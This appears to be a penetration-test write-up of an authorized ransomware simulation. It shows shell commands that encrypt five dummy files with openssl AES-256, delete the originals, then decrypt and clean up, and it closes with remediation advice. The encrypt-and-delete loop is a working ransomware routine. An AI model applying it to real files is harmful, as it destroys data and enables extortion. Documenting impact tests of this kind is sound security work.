# Ransomware Simulation (Controlled)

## Scenario
Authorized impact testing — demonstrate file encryption capability using test files only.

## Step 1: Create Test Environment
```bash
root@target:~# mkdir -p /tmp/ransomware_test/documents
root@target:~# for i in $(seq 1 5); do
    echo "Test document $i - Created $(date) for pentest simulation" > "/tmp/ransomware_test/documents/file_$i.txt"
done

root@target:~# ls -la /tmp/ransomware_test/documents/
-rw-r--r-- 1 root root 67 Jan 15 20:00 file_1.txt
-rw-r--r-- 1 root root 67 Jan 15 20:00 file_2.txt
-rw-r--r-- 1 root root 67 Jan 15 20:00 file_3.txt
-rw-r--r-- 1 root root 67 Jan 15 20:00 file_4.txt
-rw-r--r-- 1 root root 67 Jan 15 20:00 file_5.txt

root@target:~# cat /tmp/ransomware_test/documents/file_1.txt
Test document 1 - Created Wed Jan 15 20:00:00 EST 2025 for pentest simulation
```

## Step 2: Encrypt Test Files
```bash
root@target:~# RANSOM_KEY=$(openssl rand -hex 32)
root@target:~# echo "$RANSOM_KEY" > /tmp/ransomware_test/.decryption_key

root@target:~# for file in /tmp/ransomware_test/documents/*.txt; do
    openssl enc -aes-256-cbc -salt -pbkdf2 -in "$file" -out "${file}.locked" -k "$RANSOM_KEY"
    rm "$file"
    echo "Encrypted: $file"
done
Encrypted: /tmp/ransomware_test/documents/file_1.txt
Encrypted: /tmp/ransomware_test/documents/file_2.txt
Encrypted: /tmp/ransomware_test/documents/file_3.txt
Encrypted: /tmp/ransomware_test/documents/file_4.txt
Encrypted: /tmp/ransomware_test/documents/file_5.txt

root@target:~# ls -la /tmp/ransomware_test/documents/
-rw-r--r-- 1 root root 96 Jan 15 20:01 file_1.txt.locked
-rw-r--r-- 1 root root 96 Jan 15 20:01 file_2.txt.locked
-rw-r--r-- 1 root root 96 Jan 15 20:01 file_3.txt.locked
-rw-r--r-- 1 root root 96 Jan 15 20:01 file_4.txt.locked
-rw-r--r-- 1 root root 96 Jan 15 20:01 file_5.txt.locked

root@target:~# file /tmp/ransomware_test/documents/file_1.txt.locked
file_1.txt.locked: openssl enc'd data with salted password
```

## Step 3: Verify Encryption
```bash
root@target:~# cat /tmp/ransomware_test/documents/file_1.txt.locked
Salted__[binary garbage]  # <-- Encrypted, unreadable ✅
```

## Step 4: ROLLBACK — Decrypt All Files
```bash
root@target:~# RANSOM_KEY=$(cat /tmp/ransomware_test/.decryption_key)
root@target:~# for file in /tmp/ransomware_test/documents/*.locked; do
    outfile="${file%.locked}"
    openssl enc -d -aes-256-cbc -pbkdf2 -in "$file" -out "$outfile" -k "$RANSOM_KEY"
    rm "$file"
    echo "Decrypted: $outfile"
done
Decrypted: /tmp/ransomware_test/documents/file_1.txt
Decrypted: /tmp/ransomware_test/documents/file_2.txt
Decrypted: /tmp/ransomware_test/documents/file_3.txt
Decrypted: /tmp/ransomware_test/documents/file_4.txt
Decrypted: /tmp/ransomware_test/documents/file_5.txt

root@target:~# cat /tmp/ransomware_test/documents/file_1.txt
Test document 1 - Created Wed Jan 15 20:00:00 EST 2025 for pentest simulation
# Original content restored ✅
```

## Step 5: Cleanup
```bash
root@target:~# rm -rf /tmp/ransomware_test/
```

## Evidence Summary
- Files encrypted with AES-256-CBC (industry-standard ransomware encryption)
- 5 test files encrypted → unreadable → successfully decrypted
- **No production data was affected**
- Demonstrates: if attacker has root, they can encrypt any file on disk
- Remediation: offline backups, EDR with ransomware detection, file integrity monitoring
